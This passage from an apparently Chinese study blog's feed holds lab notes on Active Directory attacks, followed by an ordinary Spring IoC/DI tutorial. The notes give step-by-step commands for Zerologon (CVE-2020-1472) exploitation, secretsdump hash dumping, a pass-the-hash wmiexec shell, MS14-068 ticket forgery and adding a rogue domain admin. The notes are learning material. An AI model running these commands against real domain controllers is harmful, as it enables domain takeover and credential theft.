d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation)</p></blockquote><h3 id="53-复现zerologin脚本"><a class="markdownIt-Anchor" href="#53-复现zerologin脚本">#</a> 5.3 复现：zerologin 脚本</h3><ul><li>使用 zerologon_tester.py 检测是否存在漏洞</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">python3 zerologon_tester.py ad01 10.10.10.137# 参数：域控主机名 IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915163807280.png" alt="image-20220915163807280"></p><ul><li>漏洞利用：置空 DC 的密码，脚本： git clone <a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a></li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">python3 cve-2020-1472-exploit.py DC_NETBIOS_NAME DC_IP_ADDRpython3 cve-2020-1472-exploit.py ad01 10.10.10.137<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915163939943.png" alt="image-20220915163939943"></p><ul><li>使用 impacket 包中的 secretsdum.py 来获取相关的 HASh</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">python3 secretsdump.py DOMAIN&#x2F;DC_NETBIOS_NAME$@DC_IP_ADDR -no-passpython3 secretsdump.py redteam.club&#x2F;ad01\$@10.10.10.137 -no-pass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915164110430.png" alt="image-20220915164110430"></p><ul><li>使用 wmiexec.py 登录，获取一个 SHELL</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">python3 wmiexec.py -hashes &lt;HASH&gt; DOMAIN&#x2F;DOMAIN_USER@DC_IP_ADDRpython3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a5843d3ee2da05158aaf16ecb3ba969b redteam.club&#x2F;administrator@10.10.10.137<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915164319231.png" alt="image-20220915164319231"></p><h3 id="54-恢复原hash"><a class="markdownIt-Anchor" href="#54-恢复原hash">#</a> 5.4 恢复原 hash</h3><ul><li>在域控 shell 上导出 sam</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">reg save HKLM\SYSTEM system.savereg save HKLM\SAM sam.savereg save HKLM\SECURITY security.saveget system.saveget sam.saveget security.savedel &#x2F;f system.savedel &#x2F;f sam.savedel &#x2F;f security.saveexit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>使用 secretsdump.py 脚本获取文件中的原 hash</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915164723706.png" alt="image-20220915164723706"></p><ul><li>reinstall_original_pw.py，执行以下命令，获取 SAM 中原来的 HASH 并恢复原 hash</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">python3 reinstall_original_pw.py ad01 10.10.10.137<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915164930152.png" alt="image-20220915164930152"></p><ul><li>使用 secretsdump.py 再次连接检测域密码</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">python3 secretsdump.py ad01.redteam.club&#x2F;administrator@10.10.10.137 -hashes :42e2656ec24331269f82160ff5962387<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915165433050.png" alt="image-20220915165433050"></p><h2 id="6-ms14-068漏洞提权"><a class="markdownIt-Anchor" href="#6-ms14-068漏洞提权">#</a> 6、MS14-068 漏洞提权</h2><h3 id="61-简介"><a class="markdownIt-Anchor" href="#61-简介">#</a> 6.1 简介</h3><ul><li>server2008 有效 MS14068 是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。</li></ul><h3 id="62-复现"><a class="markdownIt-Anchor" href="#62-复现">#</a> 6.2 复现</h3><ul><li>第一步：利用 MS14-068 伪造生成 TGT</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">MS14-068.exe -u 用户名@域名 -p 用户密码 -s 完整域ID -d 完整域地址MS14-068.exe -u 12server1@moonsec.fbi -p 123456 -s S-1-5-21-3501430782-1563410060-2157377696-1108 -d 08server-dc.moonsec.fbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915170709072.png" alt="image-20220915170709072"></p><ul><li>第二步：利用 mimikatz 将工具得到的 TGT 票据写入内存，创建缓存证书</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">kerberos::ptc TGT_test@moonsec.fbi.ccache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>第三步：获取域管理员权限。创建一个 test 账号并加入域管理员组，从而随时可以登录域控主机进行操作</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">PsExec.exe \\08server-dc cmd.exe&#x2F;&#x2F; 添加test用户net user test abc123! &#x2F;add &#x2F;domain&#x2F;&#x2F; 把 test 用户添加进域管理员组net group &quot;domain admins&quot; test &#x2F;add &#x2F;domain&#x2F;&#x2F; 查看域管理员net group &quot;domain admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220915171202299.png" alt="image-20220915171202299"></p><ul><li>或者使用 goldenPac.py 脚本 (python 打包 exe 执行)</li></ul><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">python3 goldenPac.py -dc-ip 192.168.254.145 -target-ip 192.168.254.145 moonsec.fbi&#x2F;test:123456@08server-dc.moonsec.fbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="7-窃取域管理员令牌"><a class="markdownIt-Anchor" href="#7-窃取域管理员令牌">#</a> 7、窃取域管理员令牌</h2><ul><li>学习 cs 后补充</li></ul><h2 id="8-进程迁移"><a class="markdownIt-Anchor" href="#8-进程迁移">#</a> 8、进程迁移</h2><ul><li>学习 cs 后补充</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;域渗透&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#域渗透&quot;&gt;#&lt;/a&gt; 域渗透&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;常用命令总结&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;line-numbers language-cmd&quot; data-</summary>
      
    
    
    
    <category term="web安全" scheme="http://example.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Spring</title>
    <link href="http://example.com/post/Spring.html"/>
    <id>http://example.com/post/Spring.html</id>
    <published>2022-10-06T13:50:01.000Z</published>
    <updated>2022-10-06T13:53:42.739Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-课程内容"><a class="markdownIt-Anchor" href="#1-课程内容">#</a> 1、课程内容</h1><ol><li>Spring</li><li>SpringMVC</li><li>Maven 高级</li><li>SpringBoot</li><li>MyBatisPlus</li></ol><h1 id="2-spring课程介绍"><a class="markdownIt-Anchor" href="#2-spring课程介绍">#</a> 2、Spring 课程介绍</h1><h2 id="21-为什么要学"><a class="markdownIt-Anchor" href="#21-为什么要学">#</a> 2.1 为什么要学</h2><ul><li>Spring 技术是 JavaEE 开发必备技能，企业开发技术选型命中率 &gt; 90%</li><li>专业角度<ul><li>简化开发，降低企业级开发的复杂性</li><li>框架整合，高效整合其他技术，提高企业级应用开发与运行效率</li></ul></li><li>简化开发<ul><li>IoC</li><li>AOP<ul><li>事务处理</li></ul></li></ul></li><li>框架整合<ul><li>MyBatis</li><li>MyBatis-plus</li><li>Struts</li><li>Struts2</li><li>Hibernate</li></ul></li></ul><h2 id="22-怎么学"><a class="markdownIt-Anchor" href="#22-怎么学">#</a> 2.2 怎么学</h2><ul><li>学习 Spring 框架设计思想</li><li>学习基础操作，思考操作与思想间的联系</li><li>学习案例，熟练应用操作的同时，体会思想</li></ul><h1 id="3-初识spring"><a class="markdownIt-Anchor" href="#3-初识spring">#</a> 3、初识 Spring</h1><h2 id="31-spring家族与spring"><a class="markdownIt-Anchor" href="#31-spring家族与spring">#</a> 3.1 Spring 家族与 Spring</h2><ul><li><p>官网：<a href="https://spring.io/">Spring | Home</a></p></li><li><p>Spring 发展到今天已经形成了一种开发的生态圈，Spring 提供了若干个项目，每个项目都用于完成特定的功能</p></li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220722191745765.png" alt="image-20220722191745765"></p><ul><li>Spring Framework：底层设计框架，举足轻重地位</li><li>Spring Boot：提高开发速度</li><li>Spring Cloud：分布式开发相关技术</li></ul><h2 id="32-spring发展史"><a class="markdownIt-Anchor" href="#32-spring发展史">#</a> 3.2 Spring 发展史</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220722191903433.png" alt="image-20220722191903433"></p><h1 id="4-spring-framework系统架构"><a class="markdownIt-Anchor" href="#4-spring-framework系统架构">#</a> 4、Spring Framework 系统架构</h1><h2 id="41-spring-framework系统架构图"><a class="markdownIt-Anchor" href="#41-spring-framework系统架构图">#</a> 4.1 Spring Framework 系统架构图</h2><ul><li>Spring Framework 是 Spring 生态圈中最基础的项目，是其他项目的根基</li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220722192123071.png" alt="image-20220722192123071"></p><ol><li><p>Core Container：核心容器</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220722192202270.png" alt="image-20220722192202270"></p><p>Spring 是用来管理对象的技术</p></li><li><p>AOP：面向<mark>切面</mark>编程，依赖核心容器</p></li><li><p>Aspects：AOP 思想实现</p></li><li><p>Data Access：数据访问</p></li><li><p>Data Integration：数据集成</p></li><li><p>Web：Web 开发</p></li><li><p>Test：单元测试与集成测试</p></li></ol><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220722192531680.png" alt="image-20220722192531680"></p><h2 id="42-spring-framework学习线路"><a class="markdownIt-Anchor" href="#42-spring-framework学习线路">#</a> 4.2 Spring Framework 学习线路</h2><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220722192619818.png" alt="image-20220722192619818"></p><h1 id="5-spring核心概念"><a class="markdownIt-Anchor" href="#5-spring核心概念">#</a> 5、Spring 核心概念</h1><h2 id="41-iocdi思想"><a class="markdownIt-Anchor" href="#41-iocdi思想">#</a> 4.1 IoC/DI 思想</h2><ul><li>代码书写现状<ul><li>耦合度偏高</li></ul></li><li>解决方案<ul><li>使用对象时，在程序中不要主动使用 new 对象，转换为由<mark>外部</mark>提供对象</li></ul></li><li>IoC（Inversion of Control）<mark>控制反转</mark><ul><li>使用对象时，由主动 new 产生对象转换为由外部提供对象，此过程中对象创建控制权由程序转移到外部，此思想称为控制反转</li></ul></li></ul><h2 id="42-ioc容器"><a class="markdownIt-Anchor" href="#42-ioc容器">#</a> 4.2 IoC 容器</h2><ul><li>Spring 技术对 IoC 思想进行了实现<ul><li>Spring 提供了一个容器，称为 IOC 容器，用来充当 IoC 思想的<strong>外部</strong></li><li>IOC 容器负责对象的创建、初始化等一系列工作，被创建或被管理的对象在 IoC 容器中统称为<strong> Bean</strong></li></ul></li></ul><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220722193222688.png" alt="image-20220722193222688"></p><ul><li><p>DI（Dependency Injection）<mark>依赖注入</mark></p><ul><li><p>在容器中建立 bean 与 bean 之间的依赖关系的整个过程，称为依赖注入</p><p><img src="https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220722193455066.png" alt="image-20220722193455066"></p></li></ul></li><li><p>目标：充分解耦</p><ul><li>使用 IoC 容器管理 bean（IoC）</li><li>在 IoC 容器内将有依赖关系的 bean 进行绑定（DI）</li></ul></li><li><p>最终效果</p><ul><li>使用对象时不仅可以直接从 IoC 容器中获取，并且获取到的 bean 已绑定了所有的依赖关系</li></ul></li></ul><h1 id="6-ioc入门案例"><a class="markdownIt-Anchor" href="#6-ioc入门案例">#</a> 6、IoC 入门案例</h1><h2 id="61-入门案例思路分析"><a class="markdownIt-Anchor" href="#61-入门案例思路分析">#</a> 6.1 入门案例思路分析</h2><ol><li><p>管理什么？</p><p>Service 与 Dao</p></li><li><p>如何将被管理的对象告知 IoC 容器？（配置）</p></li><li><p>被管理的对象交给 IoC 容器，如何获取到 IoC 容器？（接口）</p></li><li><p>IoC 容器得到后，如何从容器中获取 bean？（接口方法）</p></li><li><p>使用 Spring 导入哪些坐标？（pom.xml）</p></li></ol><h2 id="62-入门案例实现"><a class="markdownIt-Anchor" href="#62-入门案例实现">#</a> 6.2 入门案例实现</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token number">1.</span>导入maven坐标    <span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span>        <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>org<span class="token punctuation">.</span>springframework<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>        <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>spring<span class="token operator">-</span>context<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>        <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">5.2</span><span class="token number">.10</span><span class="token punctuation">.</span>RELEASE<span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span>    <span class="token number">2.</span>在resources目录下创建配置文件applicationContext<span class="token punctuation">.</span>properties<span class="token number">3.</span>配置bean<span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&lt;</span>beans xmlns<span class="token operator">=</span><span class="token string">"http://www.springframework.org/schema/beans"</span>       xmlns<span class="token operator">:</span>xsi<span class="token operator">=</span><span class="token string">"http://www.w3.org/2001/XMLSchema-instance"</span>       xsi<span class="token operator">:</span>schemaLocation<span class="token operator">=</span><span class="token string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token number">1.</span>导入<span class="token class-name">Spring</span>的坐标<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>    <span class="token number">2.</span>配置bean<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>    bean标签标示配置bean，id标示给bean起名字，<span class="token keyword">class</span>表示类名<span class="token operator">--</span><span class="token operator">></span>    <span class="token operator">&lt;</span>bean id<span class="token operator">=</span><span class="token string">"bookDao"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"com.itheima.dao.impl.BookDaoImpl"</span> <span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>bean id<span class="token operator">=</span><span class="token string">"bookService"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"com.itheima.service.impl.BookServiceImpl"</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>beans<span class="token operator">></span>                <span class="token number">4.</span>创建类写方法——先获取容器，再获取bean，然后调用bean的方法<span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">BookDao</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">BookService</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span></span><span class="token class-name">ApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">ClassPathXmlApplicationContext</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App2</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//3.获取IoC容器</span>        <span class="token class-name">ApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.获取bean</span>        <span class="token class-name">BookDao</span> bookDao <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">BookDao</span><span class="token punctuation">)</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"bookDao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BookService</span> bookService <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">BookService</span><span class="token punctuation">)</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"bookService"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookService<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>注意事项：bean 定义时 id 属性在同一个上下文中不可重复</li></ul><h1 id="7-di入门案例"><a class="markdownIt-Anchor" href="#7-di入门案例">#</a> 7、DI 入门案例</h1><h2 id="71-入门案例思路分析"><a class="markdownIt-Anchor" href="#71-入门案例思路分析">#</a> 7.1 入门案例思路分析</h2><ol><li>基于 IoC 管理 bean</li><li>Service 中使用 new 形式创建的 Dao 对象能否保留？（否）</li><li>Service 中需要的 Dao 对象如何进入到 Service 中？（提供方法）</li><li>Service 与 Dao 之间的关系如何描述？（配置）</li></ol><h2 id="72-入门案例实现"><a class="markdownIt-Anchor" href="#72-入门案例实现">#</a> 7.2 入门案例实现</h2><ol><li><p>删除使用 new 的形式创建对象的代码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">BookDao</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">BookService</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//5.删除业务层中shiyongnew的</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book service save......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>提供依赖对象对应的 setter 方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span>impl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>dao<span class="token punctuation">.</span></span><span class="token class-name">BookDao</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>service<span class="token punctuation">.</span></span><span class="token class-name">BookService</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//5.删除业务层中shiyongnew的</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book service save......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//6.提供对应的set方法,这个set方法是容器在执行</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBookDao</span><span class="token punctuation">(</span><span class="token class-name">BookDao</span> bookDao<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>bookDao <span class="token operator">=</span> bookDao<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置 service 与 dao 之间的关系</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--1.导入Spring的坐标--></span><span class="token comment">&lt;!--    2.配置bean--></span><span class="token comment">&lt;!--    bean标签标示配置bean，id标示给bean起名字，class表示类名--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookService<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.service.impl.BookServiceImpl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--        7.配置Dao与Service的关系 //这里是bookService调用bookDao，所以在service标签里配置Dao--></span><span class="token comment">&lt;!--        property标示配置当前bean的属性--></span><span class="token comment">&lt;!--        name属性表示配置哪一个具体的属性--></span><span class="token comment">&lt;!--        ref表示参照哪一个bean--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span><span aria-hidden="true" 